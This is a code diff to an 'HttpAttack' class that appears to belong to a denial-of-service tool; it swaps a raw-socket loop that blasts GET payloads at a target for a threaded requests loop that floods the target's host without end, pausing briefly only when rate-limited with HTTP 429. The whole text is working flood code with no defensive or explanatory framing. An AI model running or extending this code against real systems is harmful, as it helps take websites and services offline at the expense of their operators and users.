@@ -1,43 +1,60 @@
-import socket
+import logging
+from contextlib import suppress
+from http import HTTPStatus
+from threading import Thread
 from time import sleep
 
+import requests
 from attacks.http.services import HttpService
-from constants import CRLF
 from shared.attacks import AttackRequest
-from shared.attacks.http import HttpAddress, HTTPMethods
 
 
 class HttpAttack:
     def __init__(self, attack_request: AttackRequest) -> None:
-        self._service = HttpService(attack_request)
-        self._attack_request = attack_request
-        self._CRLF = CRLF.encode()
+        self._service: HttpService = HttpService(attack_request)
+        self._attack_request: AttackRequest = attack_request
+        self._payload_size: int = self._attack_request.size.value
+        self._payload_decrease_step: int = 10
 
-    def _get_response(self, sock: socket.socket) -> tuple[bytes, bytes]:
-        response = b""
-        chuncks = sock.recv(4096)
-        while chuncks:
-            response += chuncks
-            chuncks = sock.recv(4096)
-        # NOTE: HTTP headers will be separated from the body by an empty line
-        header, _, body = response.partition(self._CRLF + self._CRLF)
+        if self._attack_request.http_meta:
+            self._http_meta = self._attack_request.http_meta
+        else:
+            raise ValueError("HTTP attack metadata should be specified")
 
-        return header, body
+    def send(self):
+        if self._attack_request.http_meta is None:
+            raise ValueError("HTTP attack metadata should be specified")
+
+        http_method = self._http_meta.method.value.lower()
+        make_request = getattr(requests, http_method)
+        host = "://".join(
+            (
+                self._attack_request.http_meta.schema.value,
+                self._attack_request.target.address,
+            )
+        )
+        requests_count = 0
+
+        with suppress(requests.ConnectTimeout, requests.ConnectionError):
+            while True:
+                payload = self._service.get_http_payload(self._http_meta.payload)
+                resp = make_request(host, payload, headers=self._service.http_headers)
+                requests_count += 1
+                if requests_count % 1_000 == 0:
+                    requests_count = 0
+                    print("[+] Checking bad status codes")
+                    if resp.status_code in [HTTPStatus.TOO_MANY_REQUESTS]:
+                        sleep(2)
 
     def run(self) -> None:
         """Create and return packet to send"""
+        THREADS_AMOUNT = 1
 
-        # TODO: Move out this validation
-        if not isinstance(self._attack_request.address, HttpAddress):
-            raise Exception(f"Please specify HttpAddress instead of {type(self._attack_request.address)}")
+        threads = [Thread(target=self.send) for _ in range(THREADS_AMOUNT)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
 
-        address: HttpAddress = self._attack_request.address
-        sock = self._service.get_socket(address.target)
-
-        while self._service.ping(sock):
-            try:
-                sock.send(self._service.http_payload(method=HTTPMethods.GET))
-                sleep(0.0001)
-
-            except (BrokenPipeError, ConnectionResetError):
-                sock = self._service.get_socket(address.target)
+        if self._payload_size != self._attack_request.size.value:
+            logging.warning(f"Payload size was decreased to {self._payload_size} bits")
